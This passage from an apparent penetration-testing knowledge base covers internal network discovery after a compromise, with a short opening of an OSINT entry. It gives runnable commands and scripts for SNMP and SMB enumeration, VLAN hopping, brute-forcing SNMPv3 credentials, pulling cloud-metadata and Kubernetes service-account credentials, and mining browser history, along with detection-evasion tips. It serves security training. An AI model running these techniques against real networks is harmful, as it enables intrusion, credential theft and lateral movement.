hosts are on each subnet?\n4. What services are running?\n5. Where are the domain controllers, file servers, databases?\n6. Are there dual-homed hosts I can use to reach isolated segments?\n\n**Analogy:** You've entered a building through a side door. Now you need to understand the floor plan — where are the stairs, elevators, security office, server room? That's network topology mapping.\n\n**Key insight:** ARP scans work even when host firewalls block ICMP and port scans, because ARP operates at Layer 2 (below the OS firewall). This makes it the most reliable local discovery method.\n\n## ◈ INTERMEDIATE\n\nAfter initial foothold, mapping the internal network is essential for identifying lateral movement paths, segmentation boundaries, and high-value targets.\n\n## Layer 2 Discovery\n\n**ARP scanning** reveals all hosts on the local subnet regardless of firewall rules:\n\n```bash\n# arp-scan for local subnet\narp-scan -l -I eth0\n\n# Nmap ARP discovery (most reliable on LAN)\nnmap -sn -PR 192.168.1.0/24\n\n# From Windows (native)\narp -a\n```\n\nARP scans cannot be blocked by host firewalls since they operate at Layer 2. This is the most reliable method for local subnet enumeration.\n\n## ICMP & Layer 3 Probing\n\n```bash\n# Ping sweep\nnmap -sn 10.0.0.0/24\n\n# Traceroute for path analysis\ntraceroute -I target_ip # ICMP\ntraceroute -T -p 443 target_ip # TCP (bypasses ICMP filtering)\ntraceroute -U target_ip # UDP\n\n# Map multiple subnets with parallel pings\nfor i in $(seq 1 254); do ping -c1 -W1 10.0.$i.1 & done 2>/dev/null | grep \"bytes from\"\n```\n\nTraceroute output reveals router hops, network segmentation boundaries, and potential firewall locations (where TTL-exceeded responses stop).\n\n## NetBIOS & SMB Enumeration\n\n```bash\n# NetBIOS name scan\nnbtscan 192.168.1.0/24\n\n# SMB null session enumeration\nenum4linux -a target_ip\nsmbclient -N -L //target_ip\n\n# CrackMapExec for mass SMB enum\ncrackmapexec smb 10.0.0.0/24 --shares\ncrackmapexec smb 10.0.0.0/24 --users\ncrackmapexec smb 10.0.0.0/24 --groups\n```\n\nSMB null sessions on older/misconfigured systems reveal domain users, groups, shares, and password policies — critical intelligence for password spraying.\n\n## SNMP Enumeration\n\nSNMP v1/v2c with default community strings exposes extensive host information:\n\n```bash\n# Community string brute-force\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.0.0.0/24\n\n# Full SNMP walk\nsnmpwalk -v2c -c public target_ip\n\n# Specific OIDs for high-value data\nsnmpwalk -v2c -c public target_ip 1.3.6.1.2.1.25.4.2.1.2 # Running processes\nsnmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.25 # User accounts\nsnmpwalk -v2c -c public target_ip 1.3.6.1.2.1.6.13.1.3 # TCP connections\nsnmpwalk -v2c -c public target_ip 1.3.6.1.2.1.25.6.3.1.2 # Installed software\n```\n\nSNMP v3 requires credentials but is occasionally misconfigured with NoAuthNoPriv.\n\n## LLMNR/NBT-NS/mDNS Poisoning for Mapping\n\nRunning **Responder** in analyze mode (no poisoning) passively maps hosts that send broadcast name resolution queries:\n\n```bash\nresponder -I eth0 -A\n```\n\nThis reveals hostnames, domain membership, and which services hosts are attempting to reach — without any active poisoning that could disrupt the network.\n\n## IPv6 Discovery\n\nMany networks deploy IPv6 alongside IPv4 but forget to apply equivalent security controls:\n\n```bash\n# IPv6 neighbor discovery\nping6 -c2 ff02::1%eth0\nip -6 neigh show\n\n# Nmap IPv6 scan\nnmap -6 -sn fe80::/10%eth0\n```\n\nIPv6 link-local addresses (`fe80::`) are always present on modern systems. SLAAC-derived addresses encode the MAC address, providing hardware fingerprinting.\n\n## Service Discovery Protocols\n\n```bash\n# SSDP/UPnP discovery\ngssdp-discover --timeout=5\n\n# mDNS/Bonjour\navahi-browse -a -t -r\n\n# LLMNR passive listening\ntcpdump -i eth0 port 5355\n```\n\n## Cloud Metadata Endpoints\n\nFrom a compromised cloud instance, the metadata service reveals credentials and network configuration:\n\n```bash\n# AWS IMDSv1 (if not enforced to v2)\ncurl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Azure IMDS\ncurl -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"\n\n# GCP\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/\n\n# Alibaba Cloud\ncurl http://100.100.100.200/latest/meta-data/\n```\n\n## Kubernetes API Discovery\n\n```bash\n# Check for unauthenticated API server\ncurl -k https://kubernetes_ip:6443/api/v1/namespaces\ncurl -k https://kubernetes_ip:10250/pods # Kubelet\n\n# From inside a pod\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\ncurl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces\n```\n\n## Network Mapping Tools\n\nConsolidate findings into network maps using tools like **Graphviz**, **draw.io**, or **BloodHound** (for AD environments). Document subnets, VLANs, trust boundaries, and high-value targets for attack path planning.\n\n## OpSec Notes\n\n- ARP scans are invisible to network IDS but may be logged by NAC solutions\n- SNMP walks generate significant traffic — rate limit queries\n- Avoid aggressive ICMP sweeps; prefer targeted probing based on known subnet ranges\n- LLMNR/NBT-NS analyze mode is completely passive and safe\n- Cloud metadata queries are logged in cloud audit trails (CloudTrail, Azure Activity Log)\n\n---\n\n## VLAN Hopping\n\nVLANs are not security boundaries — misconfigured trunking enables cross-VLAN access:\n\n```bash\n# Switch Spoofing: negotiate trunk link with DTP (Dynamic Trunking Protocol)\n# Requires: switch port in auto/desirable DTP mode (Cisco default on older switches)\nsudo apt install vlan\nsudo modprobe 8021q\n\n# Yersinia: DTP trunk negotiation\nsudo yersinia dtp -attack 1 # enable trunking on connected port\n# Once trunk established: add sub-interfaces for each VLAN\nsudo ip link add link eth0 name eth0.20 type vlan id 20\nsudo ip addr add 192.168.20.50/24 dev eth0.20\nsudo ip link set eth0.20 up\n\n# Double Tagging (one-way — attacker VLAN must match native VLAN):\n# Craft frame with two 802.1Q tags: outer=native VLAN, inner=target VLAN\n# First switch strips outer tag, second switch forwards to target VLAN\n# Limitation: replies don't come back (need asymmetric path)\nfrom scapy.all import *\npkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst=\"192.168.20.1\")/ICMP()\nsendp(pkt, iface=\"eth0\")\n\n# Netdiscover: passive/active ARP host discovery\nsudo apt install netdiscover\nsudo netdiscover -r 192.168.1.0/24 # active ARP sweep\nsudo netdiscover -p # passive mode (just listen)\nsudo netdiscover -i eth0 -r 10.0.0.0/8 # larger range\n```\n\n---\n\n## Routing Table Enumeration (Post-Compromise)\n\n```bash\n# Windows: reveal network segments reachable from compromised host\nroute print\nnetstat -rn\nipconfig /all\n\n# Linux\nip route show\nip neigh show # ARP cache → discovered hosts\ncat /proc/net/route # raw routing table\n\n# Identify dual-homed hosts (multiple network interfaces — ideal pivot points)\n# Windows: ipconfig /all | findstr \"IPv4\\|Subnet\\|Default\"\n# Linux: ip addr show | grep \"inet \"\n```\n\n## ◈ ADVANCED\n\n### Agent-Based Network Enumeration\n\nRunning discovery from inside an agent avoids the OpSec risks of external scanning. The `mod_netdiscover` module performs ARP + port scanning entirely within the implant process:\n\n```json\n{\n \"module\": \"mod_netdiscover\",\n \"params\": {\n \"target\": \"10.0.0.0/8\",\n \"ports\": \"22,80,443,445,3389,5985,8080,8443\",\n \"technique\": \"connect\",\n \"timeout_ms\": 300\n }\n}\n```\n\nThis generates internal traffic that looks like normal host-to-host communication — far less suspicious than external scanning.\n\n### Passive Internal Mapping via Traffic Analysis\n\nDeploy a lightweight packet capture on the compromised host to passively map the network without sending a single probe:\n\n```go\n// Conceptual: parse ARP traffic to build host map\n// Requires CAP_NET_RAW or equivalent\n// Run for 5-10 minutes on busy networks to map entire subnets\nfunc passiveARPMap(iface string) map[string]string {\n // capture ARP packets on iface\n // extract sender IP → MAC pairs\n // return complete local subnet map\n // no packets sent — completely invisible\n}\n```\n\nThis technique is undetectable by IDS/IPS — no anomalous traffic generated.\n\n### Automated Pivot Path Discovery\n\nAfter mapping multiple subnets from a dual-homed host, use graph traversal to find the optimal attack path:\n\n```python\nimport networkx as nx\n\n# Build network graph from discovered hosts/routes\nG = nx.DiGraph()\nG.add_edge(\"attacker\", \"workstation01\", weight=1)\nG.add_edge(\"workstation01\", \"fileserver02\", weight=1) # dual-homed\nG.add_edge(\"fileserver02\", \"DC01\", weight=1)\n\n# Find shortest path to domain controller\npath = nx.shortest_path(G, \"attacker\", \"DC01\")\nprint(\"Attack path:\", \" → \".join(path))\n```\n\n### SNMP v3 Credential Discovery\n\nSNMP v3 uses authentication but weak configurations are common:\n\n```python\nfrom pysnmp.hlapi import *\n\n# Try common auth/priv combinations\nfor user, auth_key, priv_key in [\n (\"admin\", \"adminpass\", \"privpass\"),\n (\"monitor\", \"monitor123\", \"monitor123\"),\n (\"snmpv3user\", \"authkey1\", \"privkey1\"),\n]:\n iterator = getCmd(\n SnmpEngine(),\n UsmUserData(user, authKey=auth_key, privKey=priv_key,\n authProtocol=usmHMACSHAAuthProtocol,\n privProtocol=usmAesCfb128Protocol),\n UdpTransportTarget((TARGET_IP, 161)),\n ContextData(),\n ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0))\n )\n errorIndication, errorStatus, _, varBinds = next(iterator)\n if not errorIndication and not errorStatus:\n print(f\"Valid credentials: {user}/{auth_key}/{priv_key}\")\n```\n\n### Network Topology Reconstruction from Logs\n\nWhen direct scanning is too risky, reconstruct topology from logs already present on compromised hosts:\n\n```bash\n# Windows: event logs reveal connection attempts\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4648]]\" | \\\n Select-Object -ExpandProperty Message | \\\n Select-String \"Target Server Name:\"\n\n# DNS cache reveals recently contacted hosts\nipconfig /displaydns | findstr \"Record Name\"\nGet-DnsClientCache | Select-Object Entry, Data\n\n# Firewall logs (if local firewall is enabled)\nGet-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | \\\n Get-NetFirewallPortFilter\n\n# Browser history — reveals internal web apps\nsqlite3 \"C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" \\\n \"SELECT url FROM urls WHERE url LIKE 'http://10.%' OR url LIKE 'http://192.168.%'\"\n```\n\nThis passive approach rebuilds a significant network picture without generating any new traffic.", "last_updated": "2026-03-18"}, "passive-recon": {"slug": "passive-recon", "title": "Passive Reconnaissance & OSINT", "category": "Reconnaissance", "content": "# Passive Reconnaissance & OSINT\n\n## ◈ BEGINNER\n\n### What Is Passive Reconnaissance?\n\nPassive reconnaissance is the art of gathering intelligence about a target without ever directly touching their systems. Think of it like researching a company on LinkedIn, reading their public blog posts, and looking up their office address on Google Maps — none of these actions alert the company that you are investigating them. No packets are sent to target-owned infrastructure, no login pages are probed, and no scans are executed against their servers.\n\nThis is always the first phase of any engagement because it carries zero risk of detection. You are simply collecting publicly available information — also known as Open Source Intelligence (OSINT).\n\n### Why Does It Matter?\n\nBefore you ever interact with a target, you need to understand their attack surface: what domains they own, what services they expose to the internet, what technologies they use, who works there, and what their email format looks like.
